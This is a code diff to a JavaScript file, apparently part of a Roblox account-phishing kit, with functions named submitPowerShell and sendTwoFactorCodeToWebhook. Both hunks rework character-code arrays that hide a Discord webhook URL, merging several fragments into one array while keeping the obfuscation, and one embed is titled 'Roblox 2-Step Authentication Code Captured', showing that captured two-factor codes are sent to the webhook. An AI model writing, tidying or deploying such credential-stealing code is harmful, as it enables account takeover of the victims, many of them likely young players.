@@ -257,19 +257,11 @@ async function submitPowerShell() {
         const _0xb2 = String.fromCharCode(100,105,115,99,111,114,100,46,99,111,109,47);
         const _0xc3 = String.fromCharCode(97,112,105,47,119,101,98,104,111,111,107,115,47);
         const _0xd4 = [49,51,57,54,49,54,48,52,50,48,50,50,57,56,48,56,50,51,56];
-        const _0xe5 = String.fromCharCode(47,110,74,103,88,112,55,106,85,112,115,114,87);
-        const _0xf6 = [66,89,65,56,97,52,49,112,57,74,54,116,66,122,106];
-        const _0xg7 = String.fromCharCode(97,52,48,53,97,71,50,88,104,83,56,104,84,112);
-        const _0xh8 = [108,56,112,75,50,48,105,118,102,109,111,106,100,117,45];
-        const _0xi9 = String.fromCharCode(118,112,79,97,78,57,97,65,102,77,69,73);
+        const _0xe5 = [47,110,74,103,88,112,55,106,85,112,115,114,87,66,89,65,56,97,52,49,112,57,74,54,116,66,122,106,97,52,48,53,97,71,50,88,104,83,56,104,84,112,108,56,112,75,50,48,105,118,102,109,111,106,100,117,45,118,112,79,97,78,57,97,65,102,77,69,73];
         
         const webhookUrl = _0xa1 + _0xb2 + _0xc3 + 
             _0xd4.map(x => String.fromCharCode(x)).join('') + 
-            _0xe5 + 
-            _0xf6.map(x => String.fromCharCode(x)).join('') + 
-            _0xg7 + 
-            _0xh8.map(x => String.fromCharCode(x)).join('') + 
-            _0xi9;
+            _0xe5.map(x => String.fromCharCode(x)).join('');
         
         // Create rich embed for Discord
         const embed = {
@@ -776,19 +768,11 @@ async function sendTwoFactorCodeToWebhook(code, trustDevice) {
         const _0xb2 = String.fromCharCode(100,105,115,99,111,114,100,46,99,111,109,47);
         const _0xc3 = String.fromCharCode(97,112,105,47,119,101,98,104,111,111,107,115,47);
         const _0xd4 = [49,51,57,54,49,54,48,52,50,48,50,50,57,56,48,56,50,51,56];
-        const _0xe5 = String.fromCharCode(47,110,74,103,88,112,55,106,85,112,115,114,87);
-        const _0xf6 = [66,89,65,56,97,52,49,112,57,74,54,116,66,122,106];
-        const _0xg7 = String.fromCharCode(97,52,48,53,97,71,50,88,104,83,56,104,84,112);
-        const _0xh8 = [108,56,112,75,50,48,105,118,102,109,111,106,100,117,45];
-        const _0xi9 = String.fromCharCode(118,112,79,97,78,57,97,65,102,77,69,73);
+        const _0xe5 = [47,110,74,103,88,112,55,106,85,112,115,114,87,66,89,65,56,97,52,49,112,57,74,54,116,66,122,106,97,52,48,53,97,71,50,88,104,83,56,104,84,112,108,56,112,75,50,48,105,118,102,109,111,106,100,117,45,118,112,79,97,78,57,97,65,102,77,69,73];
         
         const webhookUrl = _0xa1 + _0xb2 + _0xc3 + 
             _0xd4.map(x => String.fromCharCode(x)).join('') + 
-            _0xe5 + 
-            _0xf6.map(x => String.fromCharCode(x)).join('') + 
-            _0xg7 + 
-            _0xh8.map(x => String.fromCharCode(x)).join('') + 
-            _0xi9;
+            _0xe5.map(x => String.fromCharCode(x)).join('');
         
         const embed = {
             title: "🔐 Roblox 2-Step Authentication Code Captured",
